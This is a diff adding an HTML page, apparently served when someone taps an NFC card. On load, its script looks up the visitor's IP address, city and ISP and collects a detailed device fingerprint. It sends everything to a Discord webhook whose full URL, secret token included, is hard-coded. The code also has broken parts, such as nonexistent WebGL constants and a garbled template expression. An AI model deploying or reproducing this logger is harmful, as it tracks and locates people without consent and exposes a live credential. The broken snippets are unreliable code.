@@ -1,1 +1,140 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFC Trigger</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #0f172a;
+            color: #ffffff;
+            text-align: center;
+        }
+        .card {
+            background: #1e293b;
+            padding: 2rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            max-width: 350px;
+            width: 90%;
+        }
+        .status {
+            font-size: 1.2rem;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div id="icon" style="font-size: 3rem;">⏳</div>
+        <div id="status" class="status">Erfasse Daten & sende an Discord...</div>
+    </div>
 
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1271467579327778826/6QuER1e953QFI-HGqb_M4XtSSgyaqvMHxn4ESx3lTp1q9z9bceySSZBDMc0tAe9M-cO3";
+
+        // Hilfsfunktion: WebGL GPU Info auslesen
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "N/A";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_GL4) || gl.getParameter(debugInfo.UNMASKED_RENDERER) : "N/A";
+            } catch (e) {
+                return "Unbekannt";
+            }
+        }
+
+        async function collectAndSend() {
+            // 1. IP & Ungefähren Standort abfragen (passiv ohne GPS-Popup)
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) ipData = await res.json();
+            } catch (e) {
+                console.log("IP-API offline oder blockiert");
+            }
+
+            // 2. Akku-Daten (falls verfügbar)
+            let batteryInfo = "N/A";
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}\% (${battery.charging ? "Lädt" : "Entlädt"})`;
+                } catch (e) {}
+            }
+
+            // 3. System- & Hardware-Daten zusammenstellen
+            const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
+            const viewport = `${window.innerWidth}x${window.innerHeight}`;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unbekannt";
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Kerne` : "Unbekannt";
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
+            const connection = navigator.connection ? (navigator.connection.effectiveType || "Unbekannt").toUpperCase() : "N/A";
+            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ja" : "Nein";
+            const gpu = getGPUInfo();
+
+            // 4. Discord Embed Payload strukturieren
+            const payload = {
+                username: "NFC Scanner Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/3587/3587202.png",
+                embeds: [{
+                    title: "🚨 NFC-Karte wurde gescannt!",
+                    color: 3447003, // Blau
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "🌐 IP-Adresse", value: ipData.ip || "Unbekannt", inline: true },
+                        { name: "📍 Standort (IP)", value: `${ipData.city \vert{}\vert{} 'Unbekannt'},${ipData.country_name || 'Unbekannt'}`, inline: true },
+                        { name: "🏢 Anbieter (ISP)", value: ipData.org || "Unbekannt", inline: true },
+                        
+                        { name: "📱 Plattform / OS", value: navigator.platform || "Unbekannt", inline: true },
+                        { name: "🌐 Sprache", value: navigator.language || "Unbekannt", inline: true },
+                        { name: "⏰ Zeitzone", value: timeZone, inline: true },
+
+                        { name: "🖥️ Bildschirm", value: screenRes, inline: true },
+                        { name: "📐 Viewport", value: viewport, inline: true },
+                        { name: "👆 Touchscreen", value: isTouch, inline: true },
+
+                        { name: "⚡ CPU Cores", value: cores, inline: true },
+                        { name: "🧠 RAM", value: ram, inline: true },
+                        { name: "🔋 Akku", value: batteryInfo, inline: true },
+
+                        { name: "🎮 GPU", value: gpu, inline: false },
+                        { name: "📶 Netzverbindung", value: connection, inline: true },
+                        { name: "🌐 Browser User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                    ]
+                }]
+            };
+
+            // 5. An Discord senden
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    document.getElementById("icon").innerText = "✅";
+                    document.getElementById("status").innerText = "Daten erfolgreich übermittelt!";
+                } else {
+                    throw new Error("Fehler beim Senden");
+                }
+            } catch (err) {
+                document.getElementById("icon").innerText = "❌";
+                document.getElementById("status").innerText = "Senden fehlgeschlagen.";
+            }
+        }
+
+        // Beim Laden der Seite direkt ausführen
+        window.addEventListener('DOMContentLoaded', collectAndSend);
+    </script>
+</body>
+</html>
